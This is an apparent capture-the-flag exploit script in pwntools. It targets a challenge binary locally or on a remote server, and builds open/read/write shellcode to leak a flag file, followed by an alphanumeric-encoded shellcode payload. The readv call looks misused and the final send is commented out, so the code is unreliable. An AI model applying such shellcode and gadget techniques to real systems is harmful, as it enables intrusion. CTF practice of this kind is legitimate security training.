#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/06/13 07:24:35
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 1
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    sh = process('shellcode')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
else:
    IP = '39.105.137.118'
    port = 50050
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
    one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
elf = ELF('shellcode')


shellcode_addr = 0x7ffff7ff9000
shellcode = ''
shellcode += shellcraft.open('./flag')
shellcode += shellcraft.readv(3,shellcode_addr+0x50,0x30)
shellcode += shellcraft.write(1, shellcode_addr, 0x30)
payload = asm(shellcode)
print("shellcode:%s"%payload)
payload = "Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M154I04050H01050104012x0x4I7O7K0W1l0P0R01000z0I041l1L3P8P1N3u0z3V7m03047o0U0Z0Q0o1k100j0x3T010H0105000m000M0e2x4F11304p3U4K0N1K027N160Y2t0m0Z2G0o1P057o01150Z0a0j2G4O0j0001010k010y02120x4O013I8N3W8N0K01010x1l142t0n2G017m7m1M7n0L01"
# sh.sendline(payload)